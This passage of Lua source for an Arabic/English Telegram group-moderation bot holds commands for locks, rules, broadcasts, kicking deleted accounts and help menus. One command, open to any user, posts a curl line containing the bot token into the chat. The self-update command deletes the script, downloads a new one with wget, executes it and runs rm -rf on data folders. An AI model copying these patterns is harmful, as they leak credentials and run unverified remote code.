            .."🚦⁞ قفل الملفات • "..lock_file.."\n"
            .."🚦⁞ قفل الملصقات • "..lock_sticker.."\n"
            .."🚦⁞ قفل الجهات • "..lock_contact.."\n"
            .."️ 🚦⁞ قفل المواقع • "..lock_location.."\n"
            local TXTEN = "⚙ Group Settings :\n\n"
            .."◾️ *Strict Mode* : "..strict.."\n"
            .."◾️ *Group lock All* : "..mute_all.."\n"
            .."◾️ *Case of no answer* : "..mute_cmd.."\n\n"
            .."⚠️ *Centerial Settings* :\n\n"
            .."◾️ *Lock Spam* : "..lock_spam.."\n"
            .."◾️ *Lock Links* : "..mute_links.."\n"
            .."️◾️ *Lock Web-Page* :  "..lock_wp.."\n"
            .."◾️ *Lock Tag* : "..lock_tag.."\n"
            .."️◾️ *Lock Hashtag* : "..lock_htag.."\n"
            .."◾️ *Lock Forward* : "..lock_forward.."\n"
            .."◾️ *Lock Bots* :  "..mute_bots.."\n"
            .."️◾️ *Lock Edit* :  "..mute_edit.."\n"
            .."️◾️ *Lock Pin* : "..lock_pin.."\n"
            .."◾️ *Lock Inline* : "..mute_in.."\n"
            .."◾️ *Lock arabic* :  "..lock_arabic.."\n"
            .."◾️ *Lock English* : "..lock_english.."\n"
            .."◾️ *Lock MarkDown* : "..markdown.."\n"
            .."️◾️ *Lock TgService* : "..lock_tgservice.."\n"
            .."◾️ *Lock Flood* : "..mute_flood.."\n"
            .."◾️ *Flood Status* : "..floodstatus.."\n"
            .."◾️ *Flood Sensitivity* : [ "..flood_m.." ]\n"
            .."️◾️ *Spam Sensitivity* : [ "..spam_c.." ]\n\n"
            .." 🔇 *Media Settings* :\n\n"
            .."◽️ *Lock Text* : "..mute_text.."\n"
            .."◽️ *Lock Photo* : "..mute_photo.."\n"
            .."◽️ *Lock Videos* : "..mute_video.."\n"
            .."◽️ *Lock Gifs* : "..mute_gifs.."\n"
            .."◽️ *Lock Music* : "..mute_music.."\n"
            .."◽️ *Lock Voice* : "..mute_voice.."\n"
            .."◽️ *Lock File* : "..lock_file.."\n"
            .."◽️ *Lock Sticker* : "..lock_sticker.."\n"
            .."◽️ *Lock Contact* : "..lock_contact.."\n"
            .."️◽️ *Lock location* : "..lock_location.."\n"
            TXTEN = TXTEN:gsub("yse✅","yse✅")
            TXTEN = TXTEN:gsub("#no❎","'no❎'")
            TXTEN = TXTEN:gsub("بالمسح","Deleting")
            TXTEN = TXTEN:gsub("بالطرد","Kicking")
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, TXTEN, 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
            end
          end
        end
        ---------------------------------------faeder--------------------------------------------------------
        if text:match("^كول (.*)$")  then
          local txt = {string.match(text, "^(كول) (.*)$")}
          faederdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
        end
        -----------------
        if (text and text == 'enable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
  if not database:get('bot:rep:mute'..msg.chat_id_) then
  if database:get('bot:lang:'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot is already enabled*️ •', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تفعيل ردود البوت سابقا •', 1, 'md')
end
  else
  if database:get('bot:lang:'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot has been enable*️ •', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تفعيل ردود البوت •', 1, 'md')
 database:del('bot:rep:mute'..msg.chat_id_)
end
end
end
if (text and text == 'disable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
  if database:get('bot:rep:mute'..msg.chat_id_) then
  if database:get('bot:lang:'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot is already disabled*️ •', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تعطيل ردود البوت سابقا •', 1, 'md')
end
else
  if database:get('bot:lang:'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot has been disabled*️ •', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تعطيل ردود البوت •', 1, 'md')
  database:set('bot:rep:mute'..msg.chat_id_,true)
end
end
  end
        ---------------------------------------faeder--------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ss]etrules (.*)$") then
            local txt = {string.match(text, "^([Ss]etrules) (.*)$")}
            database:set('bot:rules'..msg.chat_id_, txt[2])
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group rules has been saved •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم وضع قوانين المجموعه •', 1, 'md')
            end
          end
          if text:match("^ضع قوانين (.*)$") then
            local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
            database:set('bot:rules'..msg.chat_id_, txt[2])
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group rules has been saved •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم وضع قوانين المجموعه •', 1, 'md')
            end
          end
        end
        -------------------------------------------faeder----------------------------------------------------
        if text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
          local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
          database:set('owner:note1', txt[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Saved •', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها •', 1, 'md')
          end
        end
        ---------------------------------------faeder--------------------------------------------------------
        if text:match("^جلب الملاحظه$") and is_leader(msg) then
          local note = database:get('owner:note1')
          faederdx(msg.chat_id_, msg.id_, 1, note, 1, nil)
        end
        -----------------------------------faeder--------------------------------------------------------------
        if text:match("^[Rr]ules$") or text:match("^القوانين$") then
          local rules = database:get('bot:rules'..msg.chat_id_)
          faederdx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
        end
        -----------------------------------------------------------------------------------------------
      
        ---------------------------------------------faeder--------------------------------------------------
        if text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          local txt = {string.match(text, "^(ضع اسم) (.*)$")}
          changetitle(msg.chat_id_, txt[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group name has been changed •', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم تغيير اسم المجموعه •', 1, 'md')
          end
        end
        --------------------------------------------faeder---------------------------------------------------
        if text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Plese send group photo •', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ ارسل لي الصوره الان •', 1, 'md')
          end
          database:set('bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
        end
        -----------------------------------------------------------------------------------------------
		        -----------------------------------------------------------------------------------------------
if text:match('^gplist$') or text:match('^المجموعات$') then
local list = database:smembers("bot:groups")
          local t = '🚦⁞ مجموعات البوت •\n\n'
          for k,v in pairs(list) do
          t = t..k.." - {`"..v.."`}\n" 
          end
          if #list == 0 then
           t = '🚦⁞ لا يوجد مجموعات مفعله •'
          end
          faederdx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
      end
   ----------------------------by faede-------------------------------------------------------------------
   if text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
         unpinmsg(msg.chat_id_)
        faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم الغاء تثبيت الرساله •', 1, 'md')
   end
   ------------------------------by faeder-----------------------------------------------------------------
   if text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = database:get('pinnedmsg'..msg.chat_id_)
        if pin_id then
         pin(msg.chat_id_,pin_id,0)
         faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم اعاده تثبيت الرساله •', 1, 'md')
		else
		 end
   end
        -----------------------------------------------------------------------------------------------
        
        -----------------------------------------------------------------------------------------------
  if text:match("^kick delete$") or text:match("^طرد الحسابات المحذوفه$") then
        local function deleteaccounts(extra, result)
          for k,v in pairs(result.members_) do 
        local function cleanaccounts(extra, result)
         if not result.first_name_ then
             changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
       end
   end
        getUser(v.user_id_, cleanaccounts, nil)
       end 
         faederdx(msg.chat_id_, msg.id_, 0,'🚦⁞ تم طرد الحسابات المحذوفه •', 1, 'md')
       end 
        tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
    end
--------------------------------------------------------------------------------clean kicked
if text:match("^clean kicked$") or text:match("^تنظيف قائمه الحظر$") then
    local function removeblocklist(extra, result)
      if tonumber(result.total_count_) == 0 then 
         faederdx(msg.chat_id_, msg.id_, 0,'🚦⁞ لا يوجد محظورين •', 1, 'md')
      else
      local x = 0
      for x,y in pairs(result.members_) do
        x = x + 1
        changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
  end
    faederdx(msg.chat_id_, msg.id_, 0,'🚦⁞ تم تنظيف قائمه حظر الكروب •', 1, 'md')
    end
 end
  getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
  end
  
        -----------------------------------------------------------------------------------------------
        if text and text:match('^كشف (-%d+)') and is_sudo(msg) then 
local ch = text:match('كشف (-%d+)') 
function gpinfo(arg,data)  
 local whogp = '\n💷⁞ اسم الكروب '..title_name(ch)..' •\n*💳⁞ عدد الادمنيه • '..data.administrator_count_..' •*\n*🚷⁞ عدد المحظورين • '..data.kicked_count_..' •*\n*📱⁞ عدد الاعضاء • '..data.member_count_..' •*'
  faederdx(msg.chat_id_, msg.id_, 1,whogp, 1, 'md')
 end 
getChannelFull(ch, gpinfo, nil) 
end
        -----------------------------------------------------------------------------------------------
      if text:match("^(gpinfo)$") or text:match("^معلومات المجموعه$") then
      function gpinfo(arg,data)
 -- vardump(data) 
faederdx(msg.chat_id_, msg.id_, 1, '💳⁞ ايدي المجموعه  • '..msg.chat_id_..'\n💷⁞ عدد الادمنيه • *'..data.administrator_count_..'*\n🚷⁞ عدد المحظورين • *'..data.kicked_count_..'*\n📱⁞ عدد الاعضاء • *'..data.member_count_..'*\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
        --------------------------------faeder--------------------------------------------------------------
if text == 'تفعيل البوت الخدمي' then 
local  faeder = '🚦⁞ تم تفعيل البوت الخدمي •'
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
database:del('lock:bot:free'..bot_id) 
end 
if text == 'تعطيل البوت الخدمي' then 
faeder = '🚦⁞ تم تعطيل البوت الخدمي •'
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
database:set('lock:bot:free'..bot_id,true) 
end
        if text:match('^تفعيل$') then
          function adding(extra,result,success)
            local txt = {string.match(text, "^(تفعيل)$")}
            if database:get("bot:enable:"..msg.chat_id_) then
              if not database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المجموعه سابقا •', 1, 'md')
              else
               faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group Actually added •', 1, 'md')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group has been added •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم تفعيل المجموعه •', 1, 'md')
              end
      
              database:set("bot:enable:"..msg.chat_id_,true)
              database:setex("bot:charge:"..msg.chat_id_,86400,true)
              database:sadd('sudo:data:'..msg.sender_user_id_, msg.chat_id_)
            end
          end
          getUser(msg.sender_user_id_,adding)
        end
        
        
        if text:match('^تعطيل$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local txt = {string.match(text, "^(تعطيل)$")}
          if not database:get("bot:enable:"..msg.chat_id_) then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group Actually Rem •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ المجموعه معطله سابقا •', 1, 'md')
            end
          else
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group has been Rem •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم تعطيل المجموعه •', 1, 'md')
            end
            database:del("bot:charge:"..msg.chat_id_)
            database:del("bot:enable:"..msg.chat_id_)
            database:srem('sudo:data:'..msg.sender_user_id_, msg.chat_id_)
            local v = tonumber(bot_owner)
            
          end
        end
        if text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
          database:del("bot:charge:"..gp[2])
          local v = tonumber(bot_owner)
          
        end
        ------------------------------------------faeder-----------------------------------------------------

        if text:match("^روابط الكروبات$") then
local gpss = database:smembers("bot:groups") or 0
local gps = database:scard("bot:groups") 
text = '🚦⁞ روابط كل كروبات البوت •\n\n'
for i=1, #gpss do
local link = database:get("bot:group:link"..gpss[i])
text = text.."|"..i.."| ~ "..gpss[i].."\n ~ "..(link or  "لا يوجد رابط").."\n"
end
 local f = io.open('FAEDER.txt', 'w')
 f:write(text)
 f:close()
 local faeder = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
 local curl = 'curl "' .. faeder .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'FAEDER.txt' .. '"'
 io.popen(curl)
 faederdx(msg.chat_id_, msg.id_, 1, curl, 1, 'md')
 end
        ------------------------------------faeder----------------------------------------------------------
        if text and text:match("^نشر بالخاص (.*)") and is_leader(msg) then
if not database:get('lock:add'..msg.chat_id_) then
local pm =  text:match("^نشر بالخاص (.*)")
local s2a = "🚦⁞ تم ارسال رسالتك الى •\n🗳⁞ (* GP *) شخص في خاص البوت •\n‏"
local gp = tonumber(database:scard("bot:userss"))
gps = database:smembers("bot:userss")
text = s2a:gsub('GP',gp)
for k,v in pairs(gps) do
faederdx(v, 0, 1,pm, 1, 'md')
end
faederdx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
end 
end
        -------------faeder
        if is_leader(msg) and text:match("^ارسال توجيه$") then
       if not database:get('lock:add'..msg.chat_id_) then
          database:setex("broadcast" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 60, true)
          if database:get("lang:gp:" .. msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي المنشور الان 🗳  ", 1, "md")
          else
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Please *Send* Your Message 🗳 \n🚦⁞ \n For Cancel The Operation, Send Command /Cancel 🗳 ", 1, "md")
          end
        end
 end
        ----------------------------------------------faeder-------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match('^مسح (%d+)$') then
            local matches = {string.match(text, "^(مسح) (%d+)$")}
            if msg.chat_id_:match("^-100") then
              if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
                if database:get('lang:gp:'..msg.chat_id_) then
                  pm = '🚦⁞ Please use a number greater than 1 and less than 100 •'
                else
                  pm = '📯|| اختر رقم اكبر من 1 واقل من 100 🎈'
                end
                send(msg.chat_id_,0, 1, pm, 1, 'html')
              else
                tdcli_function ({
                  ID = "GetChatHistory",
                  chat_id_ = msg.chat_id_,
                  from_message_id_ = 0,
                  offset_ = 0,
                  limit_ = tonumber(matches[2])
                }, delmsg, nil)
                if database:get('lang:gp:'..msg.chat_id_) then
                  pm ='🚦⁞ *'..matches[2]..' recent message removed* •'
                else
                  pm ='🎈|| '..matches[2]..' من الرسائل تم مسحها ✅'
                end
                faederdx(msg.chat_id_,0, 1, pm, 1, 'html')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                pm ='🚦⁞ This is not possible in the conventional group •'
              else
                pm ='🎈|| هناك خطا ❎'
              end
              faederdx(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
            end
          end
          if text:match('^[Cc]lean (%d+)$') then
            local matches = {string.match(text, "^([Cc]lean) (%d+)$")}
            if msg.chat_id_:match("^-100") then
              if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
                if database:get('lang:gp:'..msg.chat_id_) then
                  pm = '??⁞ Please use a number greater than 1 and less than 100 •'
                else
                  pm = '📯|| اختر رقم اكبر من 1 واقل من 100 🎈'
                end
                send(msg.chat_id_,0, 1, pm, 1, 'html')
              else
                tdcli_function ({
                  ID = "GetChatHistory",
                  chat_id_ = msg.chat_id_,
                  from_message_id_ = 0,
                  offset_ = 0,
                  limit_ = tonumber(matches[2])
                }, delmsg, nil)
                if database:get('lang:gp:'..msg.chat_id_) then
                  pm ='🚦⁞ *'..matches[2]..' recent message removed* •'
                else
                  pm ='🎈|| '..matches[2]..' من الرسائل تم مسحها ✅'
                end
                faederdx(msg.chat_id_,0, 1, pm, 1, 'html')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                pm ='🚦⁞ This is not possible in the conventional group •'
              else
                pm ='🎈|| هناك خطا ❎'
              end
              faederdx(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
            end
          end
        end
        --------------------------------faeder--------------------------------------------------------------
        if text:match("^الاوامر$") then
   
   local text =  [[
🚦*⁞* اوامر البــوت 
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏

  🎙*⁞* م¹ *⁞* ٱوٱمـر الحمايه ✓

  🎙*⁞* م² *⁞* ٱوٱمـر الادمنيه والمدراء ✓

  🎙*⁞* م³ *⁞* ٱوٱمـر الخدمه ✓

  🎙*⁞* م⁴ *⁞* ٱوٱمـر الوضع والمسح ✓

  🎙*⁞* م⁵ *⁞* ٱوٱمـر ٱلمطـورين ✓

┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
        if text:match("^م1$") or  text:match("^م١$") then
   
   local text =  [[
👁‍🗨 ⁞ ٱوٱمـر ٱلحمـٱيۿ ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   🔐*⁞* قفـل «» لقفـل امر ✓
   🔓*⁞* فتـح «» لفتـح امر ✓
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   📚*⁞* الـروابـط          «» المـعـرف •
   📚*⁞* الـبـوتـات         «» الشارحـه •
   📚*⁞* المتحركه         «» المـلـفـات •
   📚*⁞* الـصـور            «» الملصقات •
   📚*⁞* الفيـديـو          «» الاونـلايـن • 
   📚*⁞* الدردشـه          «» الـتوجـيـه •
   📚*⁞* الاغاني            «» الـصــوت •
   📚*⁞* الجهات            «» الماركداون •
   📚*⁞* العربيه             «» الانكلـيزيه •
   📚*⁞* الحمايه            «» الــتـكـرار •
   📚*⁞* الهاشتاك           «» الـتعديـل •
   📚*⁞* التثبيت            «» الاشعارات •
   📚*⁞* الـكـل               «» الكـلايـش •
   📚*⁞* المواقـع            «» الشبـكات •
   📚*⁞* البوتات بالطرد   «» البوتات بالتقييد •
   📚*⁞* الاشعارات •           
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 📚*⁞* الكل بالساعات + عدد الساعات 
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
  if text:match("^م2$") or text:match("^م٢$") then
   
   local text =  [[
🎖*⁞* ٱوٱمـر الرفع والتنزيل ✓   
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 🏗*⁞* رفع «» تنزيل ادمن {rep•id•us}
 🏗*⁞* رفع «» تنزيل مميز {rep•id•us}
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗

 🎖*⁞* ٱوٱمـر الحظر》تقييد》كتم》مسح  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 📛*⁞* طرد                     {rep•id•us}
 📛*⁞* مسح الكل             {rep•id•us}
 📛*⁞* حظر «» الغاء حظر {rep•id•us}
 📛*⁞* كتم  «» الغاء كتم   {rep•id•us}
 📛*⁞* تقييد«»الغاء التقييد{rep•id•us}
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗

 🎖*⁞* ٱوٱمـر اخرى  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 🗳*⁞* فحص • 
 🗳*⁞* اضف رد •
 🗳*⁞* حذف رد •

 🗳*⁞* حذف الردود •
 🗳*⁞* جلب الترحيب •
 🗳*⁞* حذف الترحيب •
 🗳*⁞* رفع المشرفين •
 🗳*⁞* معلومات المجموعه •
 🗳*⁞* طرد الحسابات المحذوفه •
 🗳*⁞* تنظيف قائمه الحظر •
 🗳*⁞* منع     «» الغاء منع •
 🗳*⁞* تثبيت «» الغاء التثبيت •
🗳*⁞* تفعيل  «» تعطيل ردود البوت •
 🗳*⁞* مسح   + العدد •
 🗳*⁞* ايدي   + المعرف •
 🗳*⁞* اضافه + معرف العضو •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗

🎖*⁞* لاضهار القوائم ✓

🗃*⁞* الدعم      «» قائمه المنع •
🗃*⁞* الردود     «» المحظورين •
🗃*⁞* المدراء    «» الاعدادات •
🗃*⁞* الادمنيه   «» المكتومين •
🗃*⁞* المقيدين  «» الاعضاء المميزين •
🗃*⁞* المطايه    «»   المميزين عام •
🗃*⁞* المنشئين  «» المدراء العامين •
🗃*⁞* الادمنيه العامين •

┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏

📚*⁞* ضع اللغه + العربيه «» الانكليزيه •

┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
  if text:match("^م3$") or text:match("^م٣$") then
   
   local text =  [[
🚦*⁞* اوامر الخدمه  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
  🗳*⁞* الوقت •
  🗳*⁞* الرابط •
  🗳*⁞* موقعي •
  🗳*⁞* رسائلي •
  🗳*⁞* ايديي •
  🗳*⁞* معرفي •
  🗳*⁞* اسمي •
  🗳*⁞* ايدي •
  🗳*⁞* معلوماتي •
  🗳*⁞* القوانين •
  🗳*⁞* السورس •
  🗳*⁞* المطور •
  🗳*⁞* ايدي بالرد •
  🗳*⁞* هينه بالرد •
  🗳*⁞* بوسه بالرد •
  🗳*⁞* بوسها بالرد •
  🗳*⁞* رابط الحذف •
  🗳*⁞* مشاهده المنشور •
  🗳*⁞* ايدي المجموعه •
  🗳*⁞* اسم المجموعه •
  🗳*⁞* رفع «» تنزيل مطي •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
  📚*⁞* رتبته       + المعرف •
  📚*⁞* كول       + الكلمه •
  📚*⁞* تاك        + المعرف •
  📚*⁞* هينه      + المعرف •
  📚*⁞* صورتي  + الرقم •
  📚*⁞* الحساب + الايدي •
  📚*⁞* طقس    + اسم المدينه •
  📚*⁞* زخرفه   + النص {انكلش فقط} •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
  if text:match("^م٤$") or text:match("^م4$") then
   
   local text =  [[
🎖*⁞* ٱوٱمـر لـوضع ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
    🎨*⁞* ضع + احد الاوامر ادناه •
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
    🎲*⁞* رابط   «»  قوانين • 
    🎲*⁞* صوره  «» ترحيب •
    🎲*⁞* تكرار + العدد •
    🎲*⁞* عدد الاحرف + العدد •
    🎲*⁞* اسم المجموعه + الاسم •
    🎲*⁞* التكرار + بالطرد «» بالمسح •
    🎲*⁞* الايدي + بالصوره «» بدون صوره •
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏ 
    🎨*⁞* ٱوٱمـر لمسـح ✓
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗ 
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   🗃*⁞* المحظورين «» البوتات •
   🗃*⁞* المكتومين  «» الادمنيه •
   🗃*⁞* المقيدين    «» الاعضاء المميزين •
   🗃*⁞* قائمه المنع «» قائمه المنع العام 
┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
  if text:match("^م٥$") or text:match("^م5$") then
   
   local text =  [[
🚦*⁞* اوامر المطورين  ✓
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏

  📚*⁞* تفعيل •
  📚*⁞* تعطيل •
  📚*⁞* غادر •
  📚*⁞* الكروبات •
  📚*⁞* المجموعات •
  📚*⁞* الاحصائيات •
  📚*⁞* تحديث •
  📚*⁞* تحديث السورس •

  🗳*⁞* حظر عام •
  🗳*⁞* الغاء العام •
  🗳*⁞* ضع دعم •
  🗳*⁞* حذف الدعم •
  🗳*⁞* جلب الملاحظه •
  🗳*⁞* تنظيف الرسائل •
  🗳*⁞* تنظيف الكروبات •
  🗳*⁞* روابط الكروبات •
  🗳*⁞* جلب رد الخاص •
  🗳*⁞* حذف رد الخاص •
  🗳*⁞* قائمه العام •
  🗳*⁞* قائمه المنع العام •
  🗳*⁞* مطورين الرتبه الثالثه •

  🗃*⁞* تفعيل البوت الخدمي •
  🗃*⁞* تعطيل البوت الخدمي •

  🗃*⁞* رفع «» تنزيل مدير •
  🗃*⁞* رفع «» تنزيل منشئ •
  🗃*⁞* رفع «» تنزيل مدير عام •
  🗃*⁞* رفع «» تنزيل ادمن عام •
  🗃*⁞* رفع «» تنزيل مميز عام •
  🗃*⁞* رفع «» تنزيل مطور رتبه ثالثه •

  🗃*⁞* رد الخاص تفعيل «» تعطيل •
  🗃*⁞* المغادره التلقائيه تفعيل «» تعطيل •
 
  📱*⁞* مسح المدراء •
  📱*⁞* مسح المنشئين •
  📱*⁞* مسح  قائمه العام •
  📱*⁞* مسح المميزين عام •
  📱*⁞* مسح المدراء العامين •
  📱*⁞* مسح الادمنيه العامين •
  📱*⁞* مسح قائمه المنع العام •
  📱*⁞* مسح مطورين الرتبه الثالثه •

  💷*⁞* كشف                    + ايدي الكروب •
  💷*⁞* اذاعه                    + المنشور •
  💷*⁞* فلتر عام               + الكلمه •
  💷*⁞* الغاء فلتر عام        + الكليشه •
  💷*⁞* ضع ملاحظه         + الملاحظه •
  💷*⁞* نشر بالخاص         + المنشور •
  💷*⁞* ضع رد الخاص      + الكليشه •
  💷*⁞* ضع كليشه المطور + الكليشه •

┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]]
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
  end
---------------faeder
if text == "تحديث السورس" and is_leader(msg) then 
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ جاري تحديث السورس الى الاصدار الجديد •', 1, 'md') 
os.execute('rm -rf FAEDER.lua') 
os.execute('wget https://raw.githubusercontent.com/TEAMFAEDER/FAEDER/master/FAEDER.lua') 

 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تحديث السورس اكتشف المميزات الجديده الان •', 1, 'md') 
dofile('FAEDER.lua') 
 io.popen("rm -rf ~/.telegram-cli/data/audio/*")
 io.popen("rm -rf ~/.telegram-cli/data/document/*")
 io.popen("rm -rf ~/.telegram-cli/data/photo/*")
 io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
